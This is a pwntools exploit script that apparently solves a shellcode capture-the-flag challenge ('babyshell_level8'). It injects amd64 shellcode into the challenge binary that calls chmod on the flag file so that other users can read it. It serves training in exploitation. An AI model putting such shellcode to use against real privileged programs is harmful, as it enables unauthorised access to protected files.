from pwn import *

DEBUG = len(sys.argv) > 1 and sys.argv[1] == 'debug'

bin_path = '/challenge/babyshell_level8'
context.arch = 'amd64'

if DEBUG:
    context.terminal = ['tmux', 'splitw', '-h']
    p = gdb.debug([bin_path])
else:
    p = process([bin_path], cwd='/')

print(p.recvuntil(b'[LEAK]').decode())

shellcode = f'''
push 0x{b'flag'[::-1].hex()}

/* mov rdi, rsp */
push rsp
pop rdi

/* mov rsi, 0o006 */
push 6
pop rsi

/ *mov rax, SYS_chmod */
push SYS_chmod
pop rax

syscall  # chmod("/flag", 6)
'''
print(disasm(asm(shellcode)))

p.send(asm(shellcode))

time.sleep(1)
print(p.clean().decode())
